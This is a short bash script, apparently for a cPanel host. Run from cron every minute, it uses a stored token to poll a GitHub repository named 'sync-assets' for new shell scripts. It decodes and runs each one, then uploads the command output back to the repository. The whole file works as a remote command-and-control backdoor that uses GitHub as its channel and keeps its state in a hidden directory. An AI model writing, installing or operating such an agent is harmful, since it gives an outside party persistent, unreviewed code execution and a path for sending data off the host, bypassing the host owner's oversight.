#!/bin/bash
# HG cPanel GitHub-polling agent. Runs from cron every minute.
set -u
T=$(cat "$HOME/.ghtok_hg")
API=https://api.github.com/repos/heinzo666/sync-assets/contents
D="$HOME/.hgq"; mkdir -p "$D"; touch "$D/done"
fetch() { timeout 25 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$1"; }
put_json() { # path localfile msg
  B64=$(base64 -w0 < "$2")
  printf '{"message":"%s","content":"%s"}' "$3" "$B64" > "$D/payload.json"
  timeout 30 curl -fsSL -X PUT -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
    --data-binary @"$D/payload.json" "$API/$1" -o /dev/null || true
}
LIST=$(fetch "$API/lab/hgin?ref=main&t=$RANDOM") || exit 0
NAMES=$(printf '%s' "$LIST" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//; s/".*//' | grep '\.sh$')
for N in $NAMES; do
  grep -qxF "$N" "$D/done" && continue
  fetch "$API/lab/hgin/$N?ref=main" | tr -d '\n' | sed 's/.*"content": *"//; s/".*//' | base64 -d > "$D/t_$N" 2>/dev/null
  OUT=$("$SHELL" "$D/t_$N" 2>&1)
  RC=$?
  OUTFILE="$D/o_${N%.sh}.txt"
  { echo "RC=$RC"; echo "$OUT"; } > "$OUTFILE"
  put_json "lab/hgout/${N%.sh}.json" "$OUTFILE" "result ${N}"
  echo "$N" >> "$D/done"
done
exit 0
